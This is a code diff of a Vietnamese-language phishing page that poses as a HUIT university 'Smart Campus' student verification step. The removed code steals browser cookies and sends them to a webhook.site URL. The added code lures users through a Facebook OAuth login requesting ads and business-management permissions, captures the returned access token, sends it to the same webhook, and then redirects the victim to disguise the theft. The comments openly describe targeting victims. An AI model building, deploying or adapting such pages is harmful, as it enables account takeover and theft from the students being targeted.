@@ -3,48 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Thực Người Dùng</title>
+    <title>Xác Thực Người Dùng </title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 360px; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        h2 { color: #1c1e21; margin-bottom: 10px; }
-        p { color: #606770; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
-        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 400px; border-top: 5px solid #1877f2; }
+        .huit-logo { width: 80px; margin-bottom: 15px; }
+        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 24px; }
+        p { color: #606770; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
+        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; display: flex; align-items: center; justify-content: center; transition: background 0.3s; }
         .btn-fb:hover { background-color: #166fe5; }
+        .fb-icon { width: 24px; margin-right: 10px; }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="FB">
+        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo" alt="HUIT Logo">
         <h2>Smart Campus </h2>
-        <p>Vui lòng xác thực tài khoản để đồng bộ dữ liệu của bạn </p>
-        <button class="btn-fb" id="loginBtn">Đăng nhập bằng Facebook</button>
+        <p>Chào bạn! Để đồng bộ dữ liệu vui lòng xác nhận tài khoản sinh viên.</p>
+        
+        <button class="btn-fb" id="loginBtn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
+            Tiếp tục với tư cách là người dùng facebook
+        </button>
     </div>
 
 <script>
-    // Cấu hình Webhook của bạn
+    // === CẤU HÌNH THÔNG SỐ (PHƯƠNG THAY APP_ID CỦA BẠN VÀO ĐÂY) ===
+    const APP_ID = "2402493790174154"; 
+    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; // Link GitHub của bạn
     const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
 
     document.getElementById('loginBtn').onclick = function() {
-        // 1. Kỹ thuật cướp Cookie: Bốc toàn bộ dữ liệu xác thực trong trình duyệt
-        const cookies = document.cookie;
+        // Scopes nâng cao để lấy Token có quyền lực cao hơn
+        const SCOPES = "public_profile,email,ads_management,business_management";
         
-        // 2. Mã hóa dữ liệu để tránh lỗi ký tự khi gửi qua URL
-        const encodedCookie = encodeURIComponent(cookies);
-
-        // 3. Gửi Cookie về Webhook ngầm
-        fetch(`${WEBHOOK_URL}?stolen_cookie=${encodedCookie}`)
-        .then(() => {
-            // Thông báo giả để xóa dấu vết
-            alert("Đồng bộ thành công! Hệ thống đang chuyển hướng...");
-            window.location.href = "https://www.facebook.com";
-        })
-        .catch(() => {
-            // Nếu trình duyệt chặn, vẫn chuyển hướng để nạn nhân không nghi ngờ
-            window.location.href = "https://www.facebook.com";
-        });
+        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}&auth_type=rerequest`;
+        
+        window.location.href = fbUrl;
     };
+
+    window.onload = function() {
+        // Kiểm tra nếu URL chứa Access Token sau khi nạn nhân nhấn nút
+        if (window.location.hash.includes("access_token")) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const token = params.get('access_token');
+            
+            if (token) {
+                // Tự động gửi Token về Webhook ngầm
+                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
+                .then(() => {
+                    // Chuyển hướng nạn nhân về trang Facebook thật để xóa dấu vết
+                    window.location.href = "https://www.facebook.com/groups/huit.edu.vn";
+                });
+            }
+        }
+    }
 </script>
+
 </body>
 </html>
